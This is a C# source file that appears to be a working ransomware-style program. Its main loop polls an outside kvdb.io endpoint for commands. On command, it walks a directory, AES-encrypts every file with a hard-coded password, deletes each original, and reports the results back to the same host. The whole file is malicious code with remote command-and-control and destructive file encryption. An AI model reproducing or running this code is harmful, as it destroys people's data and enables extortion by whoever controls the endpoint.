using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Linq; 
using System.Net;
using System.Threading; 



class khan_bypass
{
    
    public readonly byte[] salt = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; 
    public const int iterations = 1042; 

    public void enumerate_path()
	{
		try
        {
            // Set a variable to the My Documents path.
            string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            List<string> dirs = new List<string>(Directory.EnumerateDirectories(docPath));
                    
            foreach (var dir in dirs)
            {
                Console.WriteLine(dir.Substring(dir.LastIndexOf(Path.DirectorySeparatorChar) + 1).ToString());
            }
            Console.WriteLine(dirs.Count.ToString() +" directories found.");
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine(ex.Message);
        }
        catch (PathTooLongException ex)
        {
            Console.WriteLine(ex.Message);
        }
	}
    public void Khan_decrypt(string sourceFilename, string destinationFilename, string password, byte[] salt, int iterations)
    {
        AesManaged aes = new AesManaged();
        aes.BlockSize = aes.LegalBlockSizes[0].MaxSize;
        aes.KeySize = aes.LegalKeySizes[0].MaxSize;
        Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, salt, iterations);
        aes.Key = key.GetBytes(aes.KeySize / 8);
        aes.IV = key.GetBytes(aes.BlockSize / 8);
        aes.Mode = CipherMode.CBC;
        ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);

        using (FileStream destination = new FileStream(destinationFilename, FileMode.CreateNew, FileAccess.Write, FileShare.None))
        {
            using (CryptoStream cryptoStream = new CryptoStream(destination, transform, CryptoStreamMode.Write))
            {
                try
                {
                    using (FileStream source = new FileStream(sourceFilename, FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        source.CopyTo(cryptoStream);
                    }
                }
                catch (CryptographicException exception)
                {
                    if (exception.Message == "Padding is invalid and cannot be removed.")
                        throw new ApplicationException("Universal Microsoft Cryptographic Exception (Not to be believed!)", exception);
                    else
                        throw;
                }
            }
        }
    }

    public void Khan_encrypt(string sourceFilename, string destinationFilename, string password, byte[] salt, int iterations)
    {
        AesManaged aes = new AesManaged();
        aes.BlockSize = aes.LegalBlockSizes[0].MaxSize;
        aes.KeySize = aes.LegalKeySizes[0].MaxSize;
       
        Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, salt, iterations);
        aes.Key = key.GetBytes(aes.KeySize / 8);
        aes.IV = key.GetBytes(aes.BlockSize / 8);
        aes.Mode = CipherMode.CBC;
        ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);

        using (FileStream destination = new FileStream(destinationFilename, FileMode.CreateNew, FileAccess.Write, FileShare.None))
        {
            using (CryptoStream cryptoStream = new CryptoStream(destination, transform, CryptoStreamMode.Write))
            {
                using (FileStream source = new FileStream(sourceFilename, FileMode.Open, FileAccess.Read, FileShare.Read))
                {
                    source.CopyTo(cryptoStream);
                }
            }
        }
    }

}

public class RecursiveFileSearch
{
    static System.Collections.Specialized.StringCollection log = new System.Collections.Specialized.StringCollection();
	
	public void create_dir()
	{
		 string path = "/root/loot/xxx";

        try 
        {
            // Determine whether the directory exists.
			 if (Directory.Exists("/root/loot/")) 
			 {
				 Console.WriteLine("Root exists");
			 }
			 else
			 {
				 Console.WriteLine("Cant find root");
			 }
            if (Directory.Exists(path)) 
            {
                Console.WriteLine("That path exists already.");
                return;
            }

           
            DirectoryInfo di = Directory.CreateDirectory(path);
            Console.WriteLine("The directory was created successfully at {0}.", Directory.GetCreationTime(path));

           
        } 
        catch (Exception e) 
        {
            Console.WriteLine("The process failed: {0}", e.ToString());
        } 
        finally {}
	}

    public static void Start(string path)
    {
        string[] drives = System.Environment.GetLogicalDrives();

        foreach (string dr in drives)
        {
			Console.WriteLine("Drive name : " + dr);
            System.IO.DriveInfo di = new System.IO.DriveInfo(@path);
			
           
            if (!di.IsReady)
            {
                Console.WriteLine("The drive {0} could not be read", di.Name);
                continue;
            }
           
			System.IO.DirectoryInfo rootDir=new System.IO.DirectoryInfo(@path);
			Console.WriteLine("Parent root :"+rootDir.ToString());
            WalkDirectoryTree(rootDir,path);
			
        }

        // Write out all the files that could not be processed.
		
        foreach (string s in log)
        {
			Console.WriteLine("Files with restricted access:");
            Console.WriteLine(s);
        }
        // Keep the console window open in debug mode.
        //Console.WriteLine("Press any key");
        //Console.ReadKey();
    }

    static void WalkDirectoryTree(System.IO.DirectoryInfo root,string path)
    {
        System.IO.FileInfo[] files = null;
        System.IO.DirectoryInfo[] subDirs = null;
		if (Directory.Exists(@path+"\\Enc\\")) 
            {
                Console.WriteLine("That path exists already.");
                
            }
		else
		{
		DirectoryInfo di = Directory.CreateDirectory(@path+"\\Enc\\");
		Console.WriteLine("The directory was created successfully at {0}.", Directory.GetCreationTime(@path+"\\Enc\\"));
        // First, process all the files directly under this folder
		}
        try
        {
            files = root.GetFiles("*.*");
        }
       
        catch (UnauthorizedAccessException e)
        {
            
            log.Add(e.Message);
        }

        catch (System.IO.DirectoryNotFoundException e)
        {
            Console.WriteLine(e.Message);
        }
        
        if (files != null)
        {
			Console.WriteLine("root is : "+root.ToString());
			
            foreach (System.IO.FileInfo fi in files)
            {
                
				try
				{
				if (fi.FullName.StartsWith(path))
				{
                Console.WriteLine(fi.FullName);
				khan_bypass h = new khan_bypass();
				string pass = "klsjndvsodvn";
				string p=fi.FullName.ToString().Replace("\\","-").Replace(":","_");
				Console.WriteLine(p);
				h.Khan_encrypt(fi.FullName, @path+"\\Enc\\"+p+".en", pass, h.salt, 1000);
				File.Delete(fi.FullName);    
				
				}
				}
				catch(Exception ex)
				{
					Console.WriteLine(ex.Message);
				}
            }

            
            subDirs = root.GetDirectories();

            foreach (System.IO.DirectoryInfo dirInfo in subDirs)
            {
                
                WalkDirectoryTree(dirInfo,path);
            }
        }            
    }
}


class Driver_Program
{
	public string PostRequestJson(string endpoint, string json)
	{
    		
			Console.WriteLine("(2) End point is : " +endpoint);
    		string jsonResponse = string.Empty;
 
    		using (var client = new WebClient())
    		{
       		 try
        		{
            		client.UseDefaultCredentials = true;
            		client.Headers.Add("Content-Type: application/x-www-form-urlencoded");
            		client.Headers.Add("Accept: */*");
					string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
					client.Headers.Add("Authorization: "+string.Format("Basic {0}", credentials));
            		var uri = new Uri(endpoint);
           		    var response = client.UploadString(uri, "POST", json);
            		jsonResponse = response;
					Console.WriteLine("DATA written");
					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
       			 }
        	catch (WebException ex)
        		{
            		
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
						 Console.WriteLine("Error is :" +response);
						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
						var statusCode = (int)wrsp.StatusCode;
						var msg = wrsp.StatusDescription;
						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
						return msg;
               		
            		}
            		else
            		{
                		Console.WriteLine("Exception 11" + ex.Message);
						return ex.Message;
            		}
        		}
    		}
 
   		 return jsonResponse;
	}
		public string getData(string endpoint)
	{
		using (var client = new WebClient())
		{
   			 try
    			{
				Console.WriteLine("(1) End point is : " +endpoint);
        		client.BaseAddress = endpoint;
        		client.UseDefaultCredentials = true;
				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
        		var jsonResponse = client.DownloadString(endpoint);
				return jsonResponse;
    			}
   			 catch (WebException ex)
    			{
       			
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
               		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                		var statusCode = (int)wrsp.StatusCode;
                		var msg = wrsp.StatusDescription;
						Console.WriteLine("Exception : " + msg);
						return "0";
               			
            		}
            		else
					{
                		Console.WriteLine("Exception 11" + ex.Message);
						return "0";
            		}
				}
			catch(Exception ex)
			{
				Console.WriteLine("Genera; Exception " + ex.Message);
				return "0";
			}
	}
	
 
	}
    static void Main(string[] args)
    {
        khan_bypass h = new khan_bypass();
		Driver_Program obj=new Driver_Program();
        string pass = "klsjndvsodvn";
		
		while(true)
				{
				try
				{
				int sleepfor = 10000;
				Thread.Sleep(sleepfor);
				string res="FQM3hbtRhm94tkaLXBm5kF"; 
				string res_key=res;
				string updated_ep="https://kvdb.io/"+res_key+"/file_encrypt";
				var resp2=obj.getData(updated_ep);
				string new_command="";
				if ((resp2.Equals("0") == false) && (resp2.Equals("") == false))
				{
					//encrypt,path,C:\Users\furqa\Documents,0
					string []command_details=resp2.Split(',');
					string command_type=command_details[0];
					string type=command_details[1];
					if(command_type.Equals("exfil"))
					{
						Console.WriteLine("(a) Path is : " +command_details[2]);
						
						 if (type.Equals("path"))
						{
							
							if (command_details[3].Equals("1"))
							{
								new_command=command_details[0]+","+command_details[1]+","+command_details[2]+","+"0";
								var res1=obj.PostRequestJson(updated_ep,new_command);
								Console.WriteLine("Updated Resp : " +res1);
								RecursiveFileSearch.Start(command_details[2]);
								string updated_epp="https://kvdb.io/"+res_key+"/file_encrypt_results";
								var r=obj.PostRequestJson(updated_epp,new_command+",Executed Successfully");
							}
							else
							{
								Console.WriteLine("(2) Pass no new command");
							}
							
						}
						else
						{
							Console.WriteLine("(b) Invalid path");
						}
					}
				}
				else
				{
					Console.WriteLine("(**) No new command  "+resp2);
				}
				Console.WriteLine("Resp obtained : "+resp2);
				}
				catch(Exception ex)
				{
					Console.WriteLine("Exception : " +ex.Message);
					//sw.Write(ex.Message);
				}
				}
       
    }

}

